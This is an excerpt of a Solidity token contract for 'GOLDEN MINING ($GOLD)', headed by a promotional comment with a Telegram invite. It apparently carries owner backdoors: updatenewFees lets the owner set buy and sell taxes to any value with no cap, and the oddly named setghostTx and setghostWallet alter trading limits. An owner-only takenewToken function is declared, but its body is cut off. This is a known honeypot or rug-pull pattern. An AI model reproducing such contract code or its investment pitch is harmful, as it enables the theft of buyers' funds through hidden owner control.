/**
🟡 GOLDEN MINING IS BACK ‼️

⛏ GOLDEN MINING ($GOLD) brings the traditional gold investment concept into the digital era 🚀.

⛏ Join the GOLDEN MINING community and follow the project's developments to be a part of 
the digital gold mining revolution.

⛏ TG : https://t.me/+Coq6uc_d2u42Y2Y9
**/
...
contract GOLDENMINING is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "GOLDEN MINING";
    string private constant _symbol = unicode"$GOLD";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 11000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x13F67Fd3d61Da9c14c26Db2f581275DC2f6931f9);
    address payable public MarketingWallet = payable(0x3373bC66dc51e3CF2DD9D265D59aAB0a0ECaE1ff);
    ...
    function updatenewFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
        _tax_On_Sell = selltax;
    }
    function deleteFees() external onlyAddress {
        _tax_On_Buy = 0;
        _tax_On_Sell = 0;
    }
    function setghostTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function setghostWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function takenewToken(uint256 value, address adr) onlyAddress public virtual {
